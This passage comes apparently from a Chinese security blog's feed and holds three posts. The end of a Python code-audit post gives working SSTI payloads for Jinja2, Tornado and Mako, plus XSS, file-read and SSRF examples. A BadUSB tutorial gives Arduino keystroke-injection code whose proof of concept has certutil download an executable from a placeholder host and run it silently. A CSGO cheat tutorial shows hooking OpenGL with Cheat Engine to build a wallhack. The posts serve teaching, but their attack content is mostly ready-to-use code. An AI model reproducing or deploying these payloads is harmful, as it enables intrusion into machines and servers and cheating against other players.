class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fib</span>(<span class="params">n</span>):</span><br><span class="line">        <span class="keyword">if</span> n &lt;= <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">return</span> fib(n-<span class="number">1</span>) + fib(n-<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span> (fib(<span class="number">5</span>))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    pickle.dumps(foo.__code__)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo.__code__))</span><br><span class="line">code_unserialized = marshal.loads(base64.b64decode(code_serialized))  <span class="comment"># 到这边都没发执行</span></span><br><span class="line">code_unserialized = types.FunctionType(code_unserialized, <span class="built_in">globals</span>(), <span class="string">&#x27;&#x27;</span>)()  <span class="comment"># 动态构造后才可以执行</span></span><br></pre></td></tr></table></figure><p>如果需要执行需要配合<code>pickle.loads()</code>函数，和opcode打组合拳来实现</p><h4 id="Shelve"><a href="#Shelve" class="headerlink" title="Shelve"></a>Shelve</h4><p>太垃圾了，类似序列化一个函数一个定位的坐标，然后反序列化的时候加载这个坐标然后执行代码，必须要文件中有的代码才可以执行。相关的函数<code>shelve.open()</code></p><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p>SSTI 就是服务器端模板注入（Server-Side Template Injection）漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。</p><p>推荐一个项目：<a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p><h4 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h4><p>Jinja2是Flask框架的一部分。Jinja2会把模板参数提供的相应的值替换了<code>&#123;&#123;…&#125;&#125;</code>块，只要使用到这个包的代码只要不注意处理都会照成漏洞，下面一django来举例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"><span class="comment"># http://127.0.0.1:9999/api/test/?name=&#123;&#123;11*10&#125;&#125;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">request</span>):</span><br><span class="line">    name = request.GET[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">    t = Template(<span class="string">&quot;Hello &quot;</span> + name)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(t.render())</span><br><span class="line">    <span class="comment"># 注入修复</span></span><br><span class="line">    <span class="comment"># t = Template(&quot;Hello &#123;&#123;n&#125;&#125;&quot;)</span></span><br><span class="line">    <span class="comment"># return t.render(n=name)</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CodeAudit/Python/2.png" alt="image-20220925200355896"></p><p>然后我们可以利用之前上面所写的<strong>魔术方法</strong>方法来注入即可达成</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2和python3通用代码</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line"><span class="keyword">if</span> c.__name__==<span class="string">&#x27;_IterationGuard&#x27;</span>:</span><br><span class="line">c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure><p>换成模板注入就是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__==&#x27;_IterationGuard&#x27; %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CodeAudit/Python/3.png" alt="image-20220925200940851"></p><p>或者换成__globals__模块来是用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;# python2和python3通用代码 #&#125;</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CodeAudit/Python/4.png" alt="image-20220925201235467"></p><h4 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h4><p>tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过<code>&#123;&#123;…&#125;&#125;</code>进行传递变量和执行简单的表达式。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.template</span><br><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line">TEMPLATE = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string"> &lt;head&gt;&lt;title&gt; Hello &#123;&#123; name &#125;&#125; &lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string"> &lt;body&gt; Hello ascotbe &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainHandler</span>(tornado.web.RequestHandler):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        name = self.get_argument(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        template_data = TEMPLATE.replace(<span class="string">&quot;ascotbe&quot;</span>,name)</span><br><span class="line">        t = tornado.template.Template(template_data)</span><br><span class="line">        self.write(t.generate(name=name))</span><br><span class="line"></span><br><span class="line">application = tornado.web.Application([</span><br><span class="line">    (<span class="string">r&quot;/&quot;</span>, MainHandler),</span><br><span class="line">], debug=<span class="literal">True</span>, static_path=<span class="literal">None</span>, template_path=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    application.listen(<span class="number">8000</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.instance().start()</span><br></pre></td></tr></table></figure><p>xss代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/?name=hi%3Cimg%20src=1%20onerror=alert(%22xss%22);%3E</span><br></pre></td></tr></table></figure><p>注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/?name=&#123;%import os%&#125;&#123;&#123;os.popen(&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="Mako"><a href="#Mako" class="headerlink" title="Mako"></a>Mako</h4><p>mako 本身可以完美支持 Python 语句，所以利用 <code>&lt;% %&gt;</code>、<code>&lt;%! %&gt;</code>、<code>$&#123;&#125;</code> 可以非常轻松地进行攻，还有进行结构控制的<code>%for ... : %endfor</code>、<code>%if ... : ... %elif: ... % else: ... %endif</code>。自定义函数<code>&lt;%def name=&quot;...&quot; &gt; ... &lt;/%def&gt;</code>，调用：<code>$&#123;...()&#125;</code>。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> mako.template <span class="keyword">import</span> Template</span><br><span class="line"><span class="comment"># http://127.0.0.1:9999/api/test/?name=&#123;&#123;11*10&#125;&#125;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">request</span>):</span><br><span class="line">    name = request.GET[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">    t = Template(<span class="string">&quot;Hello,&quot;</span>+name)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(t.render())</span><br></pre></td></tr></table></figure><p>进行代码执行，没有回显</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)%&gt;</span><br><span class="line">$&#123;<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;whoami&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p>对于XXE问题只需要设置<code>resolve_entities</code>为<code>False</code>即可解决漏洞，如果没有设置的都能够执行命令</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">parser = etree.XMLParser(resolve_entities=<span class="literal">False</span>)</span><br><span class="line">tree = etree.fromstring(xml,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs;codecs.<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line">file(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h2 id="Server-Side-Request"><a href="#Server-Side-Request" class="headerlink" title="Server Side Request"></a>Server Side Request</h2><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>是否默认跟随重定向</p><ul><li>pycurl（不跟随）</li><li>urllib/urllib2/requests（跟随）</li></ul><p>默认最大重定向次数</p><ul><li>pycurl（未限制）</li><li>urllib/urllib2（10次）</li><li>requests（30次）</li></ul><h3 id="协议支持"><a href="#协议支持" class="headerlink" title="协议支持"></a>协议支持</h3><ul><li><p>urllib/urllib2：分别有协议类型http、https、ftp、file</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line">a= request.urlopen(<span class="string">&#x27;file:///etc/passwd&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a.read())</span><br><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line">a=urllib.urlopen(<span class="string">&#x27;file:///etc/passwd&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a.read())</span><br><span class="line">b=urllib2.urlopen(<span class="string">&#x27;file:///etc/passwd&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(b.read())</span><br></pre></td></tr></table></figure></li><li><p>requests：分别有协议类型http、https、ftp</p></li><li><p>pycurl：分别有协议类型dict、file、ftp、ftps、gopher、http、https、imap、imaps、ldap、ldaps、pop3、pop3s、rtmp、rtsp、scp、sftp、smtp、smtps、telnet和tftp。libcurl支持ssl证书、http-post、http-put、ftp上传、基于http表单的上传、代理、cookie、用户+密码认证（basic、digest、ntlm、negotiate、kerberos4）、文件传输恢复、http代理隧道等</p></li></ul><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>未对输入和输出做过滤，以Django举例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="comment"># http://127.0.0.1:9999/api/test/?name=&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">request</span>):</span><br><span class="line">    name = request.GET[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;hello %s&#x27;</span> %(name))</span><br><span class="line">    <span class="comment"># return render(&#x27;hello.html&#x27;, &#123;&#x27;name&#x27;:name&#125;)  # Django3以上正确的代码 </span></span><br></pre></td></tr></table></figure><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p>安全的写法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">stmt = <span class="string">&quot;SELECT * FROM table WHERE id=?&quot;</span></span><br><span class="line">connection.execute(stmt, (value,))</span><br></pre></td></tr></table></figure><p>不安全的写法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;SELECT * FROM table WHERE id=&quot;</span> + value</span><br><span class="line"><span class="string">&quot;SELECT * FROM table WHERE id=%s&quot;</span> % value</span><br><span class="line"><span class="string">&quot;SELECT * FROM table WHERE id=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(value)</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/</span><br><span class="line">https://github.com/bit4woo/python_sec</span><br><span class="line">https://www.cnblogs.com/bmjoker/p/13508538.html</span><br><span class="line">https://misakikata.github.io/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</span><br><span class="line">https://www.cnblogs.com/damoxilai/p/16707055.html</span><br><span class="line">https://mp.weixin.qq.com/s/Tb2e_2ihuMP3mWtrPtuFUQ</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="代码审计" scheme="https://www.ascotbe.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Python" scheme="https://www.ascotbe.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Python/"/>
    
    
    <category term="代码审计" scheme="https://www.ascotbe.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>简单的BadUSB</title>
    <link href="https://www.ascotbe.com/2022/07/14/BadUSB_0x01/"/>
    <id>https://www.ascotbe.com/2022/07/14/BadUSB_0x01/</id>
    <published>2022-07-14T15:58:53.000Z</published>
    <updated>2023-01-05T06:17:01.871Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/BadUSB/1.jpg" alt="1"></p><h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><p>HID（Human InterfaceDevice，是计算机直接与人交互的设备，例如键盘、鼠标等）攻击的一种。攻击者通过将USB设备模拟成为键盘，让电脑识别成为键盘，然后进行脚本模拟按键进行攻击。</p><p>PS：和之前制作的树莓派监听类似，只是这次的更加小巧</p><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ul><li><p>单片机（Arduino Leonardo）</p></li><li><p><a href="https://downloads.arduino.cc/arduino-1.8.19-windows.exe">Arduino</a></p></li></ul><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>首先我们安装好Arduino后需要把我们的单片机连接上，然后选择端口</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/BadUSB/2.png" alt="image-20220715145048875"></p><p>以及我们的开发板</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/BadUSB/3.png" alt="image-20220715145137813"></p><p>需要选着好这两个参数才能上传编辑，接着我们能看到两个函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// put your setup code here, to run once:</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// put your main code here, to run repeatedly:</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>setup这个函数是单片机通电后执行的内容</p><p>loop是通电结束后，循环执行的内容</p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><div class="note success modern"><p>写在前头：Keyboard.press 完一定要Keyboard.release 释放按键， 不然会一直按。（心酸泪）</p></div><p>了解完前置知识后先写段代码进行调试</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Keyboard.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">    Keyboard.begin();<span class="comment">//开始键盘通讯</span></span><br><span class="line">    delay(<span class="number">1000</span>);<span class="comment">//延时</span></span><br><span class="line">    Keyboard.press(KEY_LEFT_GUI);<span class="comment">//win键</span></span><br><span class="line">    delay(<span class="number">500</span>);</span><br><span class="line">    Keyboard.press(<span class="string">&#x27;r&#x27;</span>);<span class="comment">//r键</span></span><br><span class="line">    delay(<span class="number">500</span>);</span><br><span class="line">    Keyboard.release(KEY_LEFT_GUI);</span><br><span class="line">    Keyboard.release(<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">    Keyboard.press(KEY_CAPS_LOCK);</span><br><span class="line">    Keyboard.release(KEY_CAPS_LOCK);</span><br><span class="line">    delay(<span class="number">500</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;cmd /k ipconfig&quot;</span>);<span class="comment">//要执行的payload</span></span><br><span class="line">    Keyboard.press(KEY_RETURN);</span><br><span class="line">    Keyboard.release(KEY_RETURN);</span><br><span class="line">    Keyboard.press(KEY_CAPS_LOCK);</span><br><span class="line">    Keyboard.release(KEY_CAPS_LOCK);</span><br><span class="line">    Keyboard.end();<span class="comment">//结束键盘通讯</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span><span class="comment">//循环</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后点击项目-&gt;上传，即可烧录成功，拔下U盘后再插入U盘，动画效果如下（虚拟机卡卡的</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/BadUSB/4.gif" alt="动画"></p><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><div class="note success modern"><p>写在前头：实战的时候文件名最好放两个，一个全大写一个全小写</p></div><p>推进几个项目</p><ul><li><a href="https://github.com/joelsernamoreno/badusb_examples">badusb_examples</a></li><li><a href="https://github.com/Xyntax/BadUSB-code">BadUSB-code</a></li></ul><p>备份文件放在了<a href="https://github.com/Ascotbe/Image/blob/master/BadUSB/BadUSB.7z">这里</a>，使用POC为</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Keyboard.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">    Keyboard.begin();<span class="comment">//开始键盘通讯</span></span><br><span class="line">    delay(<span class="number">1000</span>);<span class="comment">//延时</span></span><br><span class="line">    Keyboard.press(KEY_LEFT_GUI);<span class="comment">//win键</span></span><br><span class="line">    delay(<span class="number">500</span>);</span><br><span class="line">    Keyboard.press(<span class="string">&#x27;r&#x27;</span>);<span class="comment">//r键</span></span><br><span class="line">    delay(<span class="number">500</span>);</span><br><span class="line">    Keyboard.release(KEY_LEFT_GUI);</span><br><span class="line">    Keyboard.release(<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">    Keyboard.press(KEY_CAPS_LOCK);</span><br><span class="line">    Keyboard.release(KEY_CAPS_LOCK);</span><br><span class="line">    delay(<span class="number">500</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;cmd /q /c mode con:COLS=15 LINES=1 &amp;&amp; certutil -urlcache -split -f http://0.0.0.0/test.exe d:\\info.exe &amp;&amp; timeout /t 1 &amp;&amp; start /B d:\\info.exe&quot;</span> );  <span class="comment">//无回显</span></span><br><span class="line">    Keyboard.press(KEY_RETURN);</span><br><span class="line">    Keyboard.release(KEY_RETURN);</span><br><span class="line">    Keyboard.press(KEY_CAPS_LOCK);</span><br><span class="line">    Keyboard.release(KEY_CAPS_LOCK);</span><br><span class="line">    Keyboard.end();<span class="comment">//结束键盘通讯</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span><span class="comment">//循环</span></span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="红蓝对抗" scheme="https://www.ascotbe.com/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    
    <category term="BadUSB" scheme="https://www.ascotbe.com/tags/BadUSB/"/>
    
    <category term="钓鱼" scheme="https://www.ascotbe.com/tags/%E9%92%93%E9%B1%BC/"/>
    
  </entry>
  
  <entry>
    <title>CSGO破解学习(八)</title>
    <link href="https://www.ascotbe.com/2022/05/19/CSGO_0x08/"/>
    <id>https://www.ascotbe.com/2022/05/19/CSGO_0x08/</id>
    <published>2022-05-19T15:58:53.000Z</published>
    <updated>2023-01-05T06:17:01.847Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/00000000.png" alt="000000"></p><h2 id="透视"><a href="#透视" class="headerlink" title="透视"></a>透视</h2><p>看到CS的显示模式是通过OpenGL来做到的，这个是微软官方的动态链接库</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/138.png" alt="image-20220515160028454"></p><p>作为图形硬件的软件接口，OpenGL 的主要用途是将二维和三维对象呈现为框架缓冲区。 这些对象被描述为顶点序列，这些顶点 (定义几何对象) 或像素 (定义图像) 。 OpenGL 对此数据执行多个过程，以将其转换为像素，以在帧缓冲区中形成最终所需的图像。</p><p>以下主题演示 OpenGL 工作原理的全局视图：</p><ul><li><a href="https://docs.microsoft.com/zh-cn/windows/win32/opengl/primitives-and-commands">基元和命令</a> 将点、线段和多边形作为绘图的基本单位进行讨论：以及命令的处理。</li><li><a href="https://docs.microsoft.com/zh-cn/windows/win32/opengl/opengl-graphic-control">OpenGL 图形控件</a> 描述哪些图形操作 OpenGL 控件及其不控制。</li><li><a href="https://docs.microsoft.com/zh-cn/windows/win32/opengl/execution-model">执行模型</a> 讨论用于解释 OpenGL 命令的客户端/服务器模型。</li><li><a href="https://docs.microsoft.com/zh-cn/windows/win32/opengl/basic-opengl-operation">基本 OpenGL 操作提供有关 OpenGL</a> 如何处理数据以在帧缓冲区中生成相应图像的高级说明。</li><li><a href="https://docs.microsoft.com/zh-cn/windows/win32/opengl/opengl-function-names">OpenGL 函数名称描述 OpenGL</a> 中使用的命名约定。</li></ul><p>我们只需要关注两个函数</p><ul><li>openGL32.dll -&gt; glBegin(开始渲染)</li><li>openGL32.dll -&gt; glDisable(关闭渲染)</li></ul><p>首先我们把CS给附加进去</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/139.png" alt="image-20220515161606329"></p><p>然后在符号表中看数据，并右键点击在反汇编中转到</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/140.png" alt="image-20220515165030293"></p><p>在转到的哪个界面按F2下个断点，这样游戏画面就不会动了</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/141.png" alt="image-20220515165304823"></p><p>接着转到调用堆栈位置，找到这个地址右击后跟随目标</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/142.png" alt="image-20220515165455471"></p><p>可以看到多个函数值，根据微软文档所述（没看过的去看官方文档），这个传入的值就是需要关闭的ID</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/143.png" alt="image-20220515165612544"></p><p>然后我们回到断点位置，禁用我们刚刚的哪个断点，让游戏跑起来，接着看下面动图，在我们未修改值之前，游戏界面的右下角人物手臂是不会阻挡到子弹数量的，而当我们修改这个参数（快捷键空格会弹出修改框），我们把值改为0，需要把剩余字节用NOP填充，就能看到人物手臂遮挡了子弹数量</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/144.gif" alt="1"></p><p>所以我们把这两段汇编获取下来，call可以不用上面的地址直接调用改DLL的函数即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 00000B71</span><br><span class="line">call opengl32.glDisable</span><br></pre></td></tr></table></figure><p>接着我们用同样的方式找到glBegin，在我们给<code>&lt;opengl32.dll.glBegin&gt;</code>中下断点后在<strong>调用堆栈</strong>中跟随目标的时候，先不急点开始，可以看到下图</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/145.png" alt="image-20220517210645148"></p><p>可以看到<code>esp+4</code>的值是9，和我们压入的哪个参数一致，所以<code>esp+4</code>就是我们压入的值，接着可以看到调用glBegin</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/146.png" alt="image-20220517203033467"></p><p>可以看到我们跳转到了这里，由于在微软文档中这个函数也是和关闭渲染一样，压入一个值进行调用的，所以我们修改下这个值（正常来说会崩溃）</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/147.gif" alt="2"></p><p>接着我们回到CE中</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/148.png" alt="image-20220517211735975"></p><p>然后在往下+4的位置，按<code>Ctrl+A</code>进入自动汇编</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/149.png" alt="image-20220517213019808"></p><p>然后和之前教程中的一样进行代码注入，接着我们把这段代码拿出来进行编辑，只需要newmem中插入如下代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmp [esp+4],0//渲染ID</span><br><span class="line">jne originalcode //判断不成立跳转到原代码</span><br><span class="line">push 00000B71//压入任务值</span><br><span class="line">call opengl32.glDisable//调用关闭渲染</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/150.png" alt="image-20220517213343965"></p><p>接着放到CT表中，修改对比的渲染ID，直到人物显示出来，这边测试这个ID是5，有些游戏有上千上万</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/151.gif" alt="3"></p><p>可以看到已经是透视了</p><h3 id="CT表下载"><a href="#CT表下载" class="headerlink" title="CT表下载"></a>CT表下载</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/CSGO1.6-8.CT</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="逆向" scheme="https://www.ascotbe.com/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="外挂" scheme="https://www.ascotbe.com/categories/%E9%80%86%E5%90%91/%E5%A4%96%E6%8C%82/"/>
    
    
    <category term="CSGO" scheme="https://www.ascotbe.com/tags/CSGO/"/>
    
    <category term="破解" scheme="https://www.ascotbe.com/tags/%E7%A0%B4%E8%A7%A3/"/>
    
    <category term="外挂" scheme="https://www.ascotbe.com/tags/%E5%A4%96%E6%8C%82/"/>
    
  </entry>
  
  <entry>
    <title>CSGO破解学习(七)</title>
